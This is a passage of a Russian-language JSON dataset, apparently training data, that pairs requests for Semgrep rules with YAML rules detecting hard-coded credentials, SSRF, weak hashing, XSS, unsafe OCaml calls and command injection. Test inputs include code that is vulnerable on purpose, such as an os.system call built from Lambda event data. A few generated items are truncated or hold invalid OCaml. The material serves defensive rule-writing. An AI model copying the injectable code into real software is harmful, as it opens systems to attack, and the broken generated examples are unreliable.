    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: hashicorp-tf-password.txt\n// ruleid: hashicorp-tf-password\nadministrator_login_password = \"thisIsDog11\"  # Ограничиваем длину\n\nОпасные паттерны:\n• administrator_login_password = \"thisIsDog11\"\n• password = \"securePassword123\"\n• var password := \"anotherSecurePass\"\n\nБезопасные паттерны:  \n• administrator_login_password = os.Getenv(\"ADMIN_PASSWORD\")\n• password = getenv(\"SECRET_PASSWORD\")\n• var password := vault.LookupSecret(\"secret/credentials\").Data.Password\n\nЛегенда аннотаций:\n- // ruleid:hashicorp-tf-password: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:hashicorp-tf-password: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: hashicorp-tf-password\n  message: A gitleaks hashicorp-tf-password was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  paths:\n    include:\n      - \"*.tf\"\n      - \"*.hcl\"\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:administrator_login_password|password)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}(\"[a-z0-9=_\\-]{8,20}\")(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных паролей в конфигурационных файлах HashiCorp Terraform (.tf) и HashiCorp Configuration Language (.hcl). Регулярное выражение ищет строки, содержащие слова 'administrator_login_password' или 'password', за которыми следуют символы, пробелы или знаки пунктуации, а затем знак равенства или другие операторы присваивания, после которых идет строка длиной от 8 до 20 символов, состоящая из букв, цифр, подчеркиваний и дефисов. Это типичный шаблон для хранения жестко закодированных учетных данных в исходном коде, что является небезопасной практикой.\n\n# Ключевые элементы:\n- ID: hashicorp-tf-password\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "hashicorp-tf-password",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: sentry-access-token\nОписание уязвимости: A gitleaks sentry-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: sentry-access-token.go\n// ruleid: sentry-access-token\nsentry_api_token = \"d4616925d6e118603fefde3f78108a4a97476a4703c62ecbee8549a82e3b3563\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: sentry-access-token.go\n// ruleid: sentry-access-token\nsentry_api_token = \"d4616925d6e118603fefde3f78108a4a97476a4703c62ecbee8549a82e3b3563\"\n• // File: another-sentry-go-file.go\n// ruleid: sentry-access-token\nsentry_access_key = \"0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdeff\"\n• // File: yet-another-sentry-file.go\n// ruleid: sentry-access-token\nsentry_auth_token = \"deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef\"\n\nБезопасные паттерны:  \n• // File: safe-go-file.go\nsentry_api_token := os.Getenv(\"SENTRY_API_TOKEN\")\n• // File: secure-go-file.go\nsentry_access_key := secureVault.Get(\"SentryAccessKey\")\n• // File: good-practice-go-file.go\nsentry_auth_token := getSecureTokenFromHsm(\"SentryAuthToken\")\n\nЛегенда аннотаций:\n- // ruleid:sentry-access-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:sentry-access-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: sentry-access-token\n  message: A gitleaks sentry-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:sentry)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-f0-9]{64})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов доступа Sentry в исходном коде. Оно ищет строку, содержащую идентификатор 'sentry' вместе с шестнадцатеричным значением длиной 64 символа, которое может быть окружено различными разделителями или операторами присваивания. Это типичное поведение при жестком кодировании секретных ключей, что является небезопасной практикой.\n\n# Ключевые элементы:\n- ID: sentry-access-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "sentry-access-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: express-wkhtmltoimage-injection\nОписание уязвимости: If unverified user data can reach the `phantom` methods it can result in Server-Side Request Forgery vulnerabilities\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: express-wkhtml-injection.js\nconst express = require('express')\nconst app = express()\nconst port = 3000\nconst wkhtmltopdf = require('wkhtmltopdf')\nconst wkhtmltoimage = require('wkhtmltoimage')\n\napp.get('/', async (req, res) => {\n  // ruleid: express-wkhtmltopdf-injection\n  const pdf = wkhtmltopdf(req.query.q, { output: 'vuln.pdf' })\n  res.send(pdf)\n})\n\napp.post('/ok', async (req, res) => {\n  // ok: express-wkhtmltopdf-injection\n  const pdf = wkhtmltopdf('<html></html>', { output: 'vuln.pdf' })\n  res.send(pdf)\n})\n\napp.post('/test', async (req, res) => {\n  // ruleid: express-wkhtmltoimage-injection\n  const img = wkhtmltoimage.generate(req.body, { output: 'vuln.pdf' })\n  res.send(img)\n})\n\napp.post('/test-ok', async (req, res) => {\n  // ok: express-wkhtmltoimage-injection\n  const data = '<html></html>'\n  const img = wkhtmltoimage.generate(data, { output: 'vuln.pdf' })\n  res.send(img)\n})\n\napp.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))  # Ограничиваем длину\n\nОпасные паттерны:\n• const img = wkhtmltoimage.generate(req.body, { output: 'vuln.pdf' })\n• const pdf = wkhtmltopdf(req.query.q, { output: 'vuln.pdf' })\n\nБезопасные паттерны:  \n• const data = '<html></html>'\n• const img = wkhtmltoimage.generate(data, { output: 'vuln.pdf' })\n\nЛегенда аннотаций:\n- // ruleid:express-wkhtmltoimage-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:express-wkhtmltoimage-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: express-wkhtmltoimage-injection\n    message: >-\n      If unverified user data can reach the `phantom` methods it can result in Server-Side Request Forgery vulnerabilities\n    metadata:\n      owasp:\n      - A10:2021 - Server-Side Request Forgery (SSRF)\n      cwe:\n      - 'CWE-918: Server-Side Request Forgery (SSRF)'\n      category: security\n      technology:\n      - express\n      references:\n      - https://www.npmjs.com/package/wkhtmltopdf\n      cwe2022-top25: true\n      cwe2021-top25: true\n      subcategory:\n      - vuln\n      likelihood: MEDIUM\n      impact: MEDIUM\n      confidence: LOW\n    severity: ERROR\n    languages: [javascript, typescript]\n    mode: taint\n    pattern-sources:\n      - patterns:\n          - pattern-either:\n              - pattern-inside: function ... ($REQ, $RES) {...}\n              - pattern-inside: function ... ($REQ, $RES, $NEXT) {...}\n              - patterns:\n                  - pattern-either:\n                      - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES) {...})\n                      - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, $NEXT) {...})\n                  - metavariable-regex:\n                      metavariable: $METHOD\n                      regex: ^(get|post|put|head|delete|options)$\n          - pattern-either:\n              - pattern: $REQ.query\n              - pattern: $REQ.body\n              - pattern: $REQ.params\n              - pattern: $REQ.cookies\n              - pattern: $REQ.headers\n      - patterns:\n          - pattern-either:\n              - pattern-inside: |\n                  ({ $REQ }: Request,$RES: Response, $NEXT: NextFunction) =>\n                  {...}\n              - pattern-inside: |\n                  ({ $REQ }: Request,$RES: Response) => {...}\n          - focus-metavariable: $REQ\n          - pattern-either:\n              - pattern: params\n              - pattern: query\n              - pattern: cookies\n              - pattern: headers\n              - pattern: body\n    pattern-sinks:\n      - patterns:\n          - pattern: $WK.generate($SINK,...)\n          - focus-metavariable: $SINK\n  - id: express-wkhtmltopdf-injection\n    message: >-\n      If unverified user data can reach the `wkhtmltopdf` methods it can result in Server-Side Request Forgery\n      vulnerabilities\n    metadata:\n      owasp:\n      - A10:2021 - Server-Side Request Forgery (SSRF)\n      cwe:\n      - 'CWE-918: Server-Side Request Forgery (SSRF)'\n      category: security\n      technology:\n      - express\n      references:\n      - https://www.npmjs.com/package/wkhtmltopdf\n      cwe2022-top25: true\n      cwe2021-top25: true\n      subcategory:\n      - vuln\n      likelihood: MEDIUM\n      impact: MEDIUM\n      confidence: LOW\n    languages:\n    - javascript\n    - typescript\n    severity: ERROR\n    mode: taint\n    pattern-sources:\n    - patterns:\n      - pattern-either:\n        - pattern-inside: function ... ($REQ, $RES) {...}\n        - pattern-inside: function ... ($REQ, $RES, $NEXT) {...}\n        - patterns:\n          - pattern-either:\n            - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES) {...})\n            - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, $NEXT) {...})\n          - metavariable-regex:\n              metavariable: $METHOD\n              regex: ^(get|post|put|head|delete|options)$\n      - pattern-either:\n        - pattern: $REQ.query\n        - pattern: $REQ.body\n        - pattern: $REQ.params\n        - pattern: $REQ.cookies\n        - pattern: $REQ.headers\n    - patterns:\n      - pattern-either:\n        - pattern-inside: |\n            ({ $REQ }: Request,$RES: Response, $NEXT: NextFunction) =>\n            {...}\n        - pattern-inside: |\n            ({ $REQ }: Request,$RES: Response) => {...}\n      - focus-metavariable: $REQ\n      - pattern-either:\n        - pattern: params\n        - pattern: query\n        - pattern: cookies\n        - pattern: headers\n        - pattern: body\n    pattern-sinks:\n    - patterns:\n      - pattern-inside: |\n          $WK = require('wkhtmltopdf');\n          ...\n      - pattern: $WK($SINK,...)\n      - focus-metavariable: $SINK\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования методов wkhtmltoimage.generate и wkhtmltopdf внутри обработчиков HTTP-запросов Express.js, где входные данные пользователя могут быть переданы напрямую в эти методы без предварительной проверки. Это может привести к SSRF-уязвимостям, так как не проверенные пользователем данные могут использоваться для выполнения запросов от имени сервера. Источники данных определяются через паттерны, такие как $REQ.query, $REQ.body и другие, а методы обнаружения включают функции-обработчики маршрутов Express.js и конкретные модули Node.js. Синки определяются путем поиска вызовов generate и wkhtmltopdf с использованием переменной, представляющей потенциально небезопасные пользовательские данные.\n\n# Ключевые элементы:\n- ID: express-wkhtmltoimage-injection\n- Язык: javascript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "express-wkhtmltoimage-injection",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: insecure-hash-algorithm-sha1\nОписание уязвимости: Detected SHA1 hash algorithm which is considered insecure. SHA1 is not collision resistant and is therefore not suitable as a cryptographic signature. Use SHA256 or SHA3 instead.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-hash-algorithm.py\n# cf. https://github.com/PyCQA/bandit/blob/b78c938c0bd03d201932570f5e054261e10c5750/examples/crypto-md5.py\n\nfrom cryptography.hazmat.primitives import hashes\nfrom Crypto.Hash import MD2 as pycrypto_md2\nfrom Crypto.Hash import MD4 as pycrypto_md4\nfrom Crypto.Hash import MD5 as pycrypto_md5\nfrom Crypto.Hash import SHA as pycrypto_sha\nfrom Cryptodome.Hash import MD2 as pycryptodomex_md2\nfrom Cryptodome.Hash import MD4 as pycryptodomex_md4\nfrom Cryptodome.Hash import MD5 as pycryptodomex_md5\nfrom Cryptodome.Hash import SHA as pycryptodomex_sha\nfrom Crypto.Hash import SHA3_256\n\n# ok:insecure-hash-algorithm-sha1\nh_obj = SHA3_256.new()\nh_obj.update(b'Some data')\nprint(h_obj.hexdigest())\n\n\n# ruleid:insecure-hash-algorithm-sha1\npycrypto_sha.new()\n\n# ruleid:insecure-hash-algorithm-sha1\npycryptodomex_sha.new()  # Ограничиваем длину\n\nОпасные паттерны:\n• pycrypto_sha.new()\n• pycryptodomex_sha.new()\n\nБезопасные паттерны:  \n• SHA3_256.new()\n• hashes.SHA256()\n\nЛегенда аннотаций:\n- // ruleid:insecure-hash-algorithm-sha1: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-hash-algorithm-sha1: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-hash-algorithm-sha1\n  message: >-\n    Detected SHA1 hash algorithm which is considered insecure. SHA1 is not\n    collision resistant and is therefore not suitable as a cryptographic\n    signature. Use SHA256 or SHA3 instead.\n  metadata:\n    source-rule-url: https://github.com/PyCQA/bandit/blob/d5f8fa0d89d7b11442fc6ec80ca42953974354c8/bandit/blacklists/calls.py#L59\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    references:\n    - https://www.schneier.com/blog/archives/2012/10/when_will_we_se.html\n    - https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/sha-1-collision-signals-the-end-of-the-algorithm-s-viability\n    - http://2012.sharcs.org/slides/stevens.pdf\n    - https://pycryptodome.readthedocs.io/en/latest/src/hash/sha3_256.html\n    category: security\n    technology:\n    - pycryptodome\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  severity: WARNING\n  languages:\n  - python\n  pattern-either:\n  - pattern: Crypto.Hash.SHA.new(...)\n  - pattern: Cryptodome.Hash.SHA.new (...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма хеширования SHA1, который считается небезопасным из-за отсутствия устойчивости к коллизиям. Правило использует шаблон pattern-either для сопоставления вызовов функций Crypto.Hash.SHA.new(...) или Cryptodome.Hash.SHA.new(...), которые указывают на использование SHA1. Это правило применимо только к Python-коду.\n\n# Ключевые элементы:\n- ID: insecure-hash-algorithm-sha1\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-hash-algorithm-sha1",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения detect-angular-translateprovider-translations-method\nОписание уязвимости: The use of $translateProvider.translations method can be dangerous if user input is provided to this API.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: detect-third-party-angular-translate.js\nvar app = angular.module('MyApp', []);\napp.controller('myCtrl', function($scope, $sce) {\n    $translateSanitization.useStrategy();\n    var output = 'Hallo <b>{{name}}</b>';\n    // ruleid:detect-angular-translateprovider-translations-method\n    $translateProvider.translations('de', {output});\n    // ruleid:detect-angular-translateprovider-translations-method\n    $translateProvider.translations('de', {GREETING: 'Hallo <b>{{name}}</b>'});\n\n});  # Ограничиваем длину\n\nОпасные паттерны:\n• var unsafeInput = document.querySelector('input').value; $translateProvider.translations('en', {HELLO: unsafeInput});\n• $translateProvider.translations('fr', {WELCOME: userProvidedData});\n• function getUserInput() { return prompt('Enter text'); } $translateProvider.translations('es', {MESSAGE: getUserInput()});\n\nБезопасные паттерны:  \n• $translateProvider.translations('en', {'HELLO': 'Hello World'});\n• const sanitizedInput = $sce.trustAsHtml(userProvidedData); $translateProvider.translations('de', {GREETING: sanitizedInput});\n• let safeMessage = 'Welcome'; $translateProvider.translations('ru', {MSG: safeMessage});\n\nЛегенда аннотаций:\n- // ruleid:detect-angular-translateprovider-translations-method: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-angular-translateprovider-translations-method: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detect-angular-translateprovider-translations-method\n  message: >-\n    The use of $translateProvider.translations method can be dangerous if user input is provided to this\n    API.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    references:\n    - https://docs.angularjs.org/api/ng/service/$sce#trustAsUrl\n    - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf\n    category: security\n    technology:\n    - angular\n    - typescript\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - javascript\n  severity: WARNING\n  patterns:\n  - pattern: |\n      $translateProvider.translations(...,$SOURCE);\n  - pattern-inside: |\n      app.controller(..., function($scope,$sce){\n      ...\n      });\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода $translateProvider.translations в AngularJS, который принимает пользовательский ввод напрямую. Паттерн ищет вызов этого метода с использованием переменной ($SOURCE), которая может представлять собой источник небезопасных данных. Это может привести к XSS-уязвимостям, если данные не были должным образом очищены или отформатированы перед передачей методу.\n\n# Ключевые элементы:\n- ID: detect-angular-translateprovider-translations-method\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "detect-angular-translateprovider-translations-method",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: ocamllint-unsafe\nОписание уязвимости: Unsafe functions do not perform boundary checks or have other side effects, use with care.\nCWE: C\nТип анализа: search\nЯзык: ocaml",
    "input": "Требования:\n- Язык: ocaml\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: unsafe.ml\nlet cb = Array.make 10 2 in\n(* ruleid:ocamllint-unsafe *)\nPrintf.printf \"%d\\n\" (Array.unsafe_get cb 12)  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: unsafe.ml\nlet cb = Array.make 10 2 in\n(* ruleid:ocamllint-unsafe *)\nPrintf.printf \"%d\\n\" (Array.unsafe_get cb 12)\n• // File: another_unsafe.ml\nlet arr = Bytes.create 10 \"test\" in\n(* ruleid:ocamllint-unsafe *)\nPrintf.printf \"%s\\n\" (Bytes.unsafe_to_string arr)\n• // File: more_unsafe.ml\nlet fd = Unix.open_connection \"localhost\" in\n(* ruleid:ocamllint-unsafe *)\nUnix.unsafe_sendto fd \"data\" 0 10\n\nБезопасные паттерны:  \n• // File: safe.ml\nlet cb = Array.make 10 2 in\nPrintf.printf \"%d\\n\" (Array.get cb 5)\n• // File: safer.ml\nlet arr = Bytes.create 10 \"test\" in\nPrintf.printf \"%s\\n\" (Bytes.sub arr 0 4)\n• // File: safest.ml\nlet fd = Unix.open_connection \"localhost\" in\nUnix.sendto fd \"data\" 0 10\n\nЛегенда аннотаций:\n- // ruleid:ocamllint-unsafe: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ocamllint-unsafe: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: ocamllint-unsafe\n    pattern-either:\n      - pattern: $X.unsafe_get        # oob array access\n      - pattern: $X.unsafe_set        # oob array access\n      - pattern: $X.unsafe_to_string    # requires unique ownership\n      - pattern: $X.unsafe_of_string    # requires unique ownership\n      - pattern: $X.unsafe_blit\n      - pattern: $X.unsafe_blit_string\n      - pattern: $X.unsafe_fill\n      - pattern: $X.unsafe_to_string\n      - pattern: $X.unsafe_getenv\n      - pattern: $X.unsafe_environment\n      - pattern: $X.unsafe_chr        # possibly wrong output for int > 255\n      - pattern: $X.unsafe_of_int\n      - pattern: $X.unsafe_output\n      - pattern: $X.unsafe_output_string\n      - pattern: $X.unsafe_read\n      - pattern: $X.unsafe_recv\n      - pattern: $X.unsafe_recvfrom\n      - pattern: $X.unsafe_send\n      - pattern: $X.unsafe_sendto\n      - pattern: $X.unsafe_set\n      - pattern: $X.unsafe_set_int16\n      - pattern: $X.unsafe_set_int32\n      - pattern: $X.unsafe_set_int64\n      - pattern: $X.unsafe_set_int8\n      - pattern: $X.unsafe_set_uint16_ne\n      - pattern: $X.unsafe_set_uint8\n      - pattern: $X.unsafe_single_write\n      - pattern: $X.unsafe_string\n      - pattern: $X.unsafe_sub\n      - pattern: $X.unsafe_write \n    message: Unsafe functions do not perform boundary checks or have other side effects, use with care.\n    languages: [ocaml]\n    severity: WARNING\n    metadata:\n      category: security\n      references:\n      - https://v2.ocaml.org/api/Bigarray.Array1.html#VALunsafe_get\n      - https://v2.ocaml.org/api/Bytes.html#VALunsafe_to_string\n      technology:\n        - ocaml\n      cwe: \"CWE-242: Use of Inherently Dangerous Function (4.12)\"\n      confidence: MEDIUM\n      likelihood: MEDIUM\n      impact: MEDIUM\n      subcategory:\n        - audit\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасных функций в языке OCaml, которые не выполняют проверку границ или имеют другие побочные эффекты. Паттерн использует оператор 'pattern-either' для объединения нескольких шаблонов, соответствующих различным небезопасным функциям, таким как 'unsafe_get', 'unsafe_set', 'unsafe_to_string' и другим. Эти функции потенциально могут привести к ошибкам выхода за границы массива или другим проблемам безопасности.\n\n# Ключевые элементы:\n- ID: ocamllint-unsafe\n- Язык: ocaml \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "ocamllint-unsafe",
      "language": "ocaml",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: dangerous-system-call\nОписание уязвимости: Detected `os` function with argument tainted by `event` object. This is dangerous if external data can reach this function call because it allows a malicious actor to execute commands. Use the 'subprocess' module instead, which is easier to use without accidentally exposing a command injection vulnerability.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dangerous-system-call.py\nimport os\n\ndef handler(event, context):\n    # ok: dangerous-system-call\n    os.system(\"ls -al\")\n\n    # ok: dangerous-system-call\n    os.popen(\"cat contents.txt\")\n\n    # ruleid: dangerous-system-call\n    os.system(f\"ls -la {event['dir']}\")  # Ограничиваем длину\n\nОпасные паттерны:\n• os.system(f\\\n\nБезопасные паттерны:  \n• os.system('ls -al')\n• os.popen('cat contents.txt')\n\nЛегенда аннотаций:\n- // ruleid:dangerous-system-call: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-system-call: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-system-call\n  mode: taint\n  message: >-\n    Detected `os` function with argument tainted by `event` object.\n    This is dangerous if external data can reach this function call because it allows a malicious\n    actor to execute commands. Use the 'subprocess' module instead, which is\n    easier to use without accidentally exposing a command injection\n    vulnerability.\n  metadata:\n    source-rule-url: https://bandit.readthedocs.io/en/latest/plugins/b605_start_process_with_a_shell.html\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    asvs:\n      section: 'V5: Validation, Sanitization and Encoding Verification Requirements'\n      control_id: 5.2.4 Dyanmic Code Execution Features\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md#v52-sanitization-and-sandboxing-requirements\n      version: '4'\n    category: security\n    technology:\n    - python\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - python\n  severity: ERROR\n  pattern-sources:\n  - patterns:\n    - pattern: event\n    - pattern-inside: |\n        def $HANDLER(event, context):\n          ...\n  pattern-sinks:\n  - patterns:\n    - focus-metavariable: $CMD\n    - pattern-either:\n      - pattern: os.system($CMD,...)\n      - pattern: os.popen($CMD,...)\n      - pattern: os.popen2($CMD,...)\n      - pattern: os.popen3($CMD,...)\n      - pattern: os.popen4($CMD,...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции `os.system`, `os.popen`, `os.popen2`, `os.popen3` или `os.popen4` с аргументами, которые могут быть загрязнены данными из объекта `event`. Источник загрязнения определен как объект `event`, а потенциальная опасность заключается в возможности выполнения команд пользователем, что может привести к выполнению произвольных команд операционной системы. Правило использует метапеременную `$CMD` для обозначения команды, которая передается в функцию, и проверяет наличие загрязненных данных внутри определения функции-обработчика (`handler`), используя шаблон inside для проверки контекста вызова.\n\n# Ключевые элементы:\n- ID: dangerous-system-call\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dangerous-system-call",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения react-jwt-decoded-property\nОписание уязвимости: Property decoded from JWT token without verifying and cannot be trustworthy.\nCWE: CWE-922: Insecure Storage of Sensitive Information\nТип анализа: search\nЯзык: typescript",
    "input": "Требования:\n- Язык: typescript\n- Тип анализа: search\n- CWE: CWE-922: Insecure Storage of Sensitive Information\n- Серьезность: INFO\n\nКонтекст кода:\n// File: react-jwt-decoded-property.tsx\nimport jwt_decode from \"jwt-decode\";\nimport { something } from \"foobar\";\n\nexport const testAuth1 = async (): Promise<void> => {\n  const { token } = await retrieveToken();\n  const decoded = jwt_decode<any>(token);\n// ruleid: react-jwt-decoded-property\n  const exp = decoded.exp * 1000;\n  return exp;\n};\n\nexport const okTestAuth1 = async (): Promise<void> => {\n  const { token } = await retrieveToken();\n// ok: react-jwt-decoded-property\n  const decoded = jwt_decode<any>(token);\n  foobar(decoded);\n};\n\n\n// File: react-jwt-decoded-property.jsx\nimport jwt_decode from \"jwt-decode\";\nimport { something } from \"foobar\";\n\nexport const testAuth1 = async () => {\n  const { token } = await retrieveToken();\n  const decoded = jwt_decode(token);\n// ruleid: react-jwt-decoded-property\n  const exp = decoded.exp * 1000;\n  return exp;\n};\n\nexport const okTestAuth1 = async () => {\n  const { token } = await retrieveToken();\n// ok: react-jwt-decoded-property\n  const decoded = jwt_decode(token);\n  foobar(decoded);\n};  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: react-jwt-decoded-property.tsx\nimport jwt_decode from \"jwt-decode\";\n...\nconst exp = decoded.exp * 1000;\n• // File: react-jwt-decoded-property.jsx\nimport jwt_decode 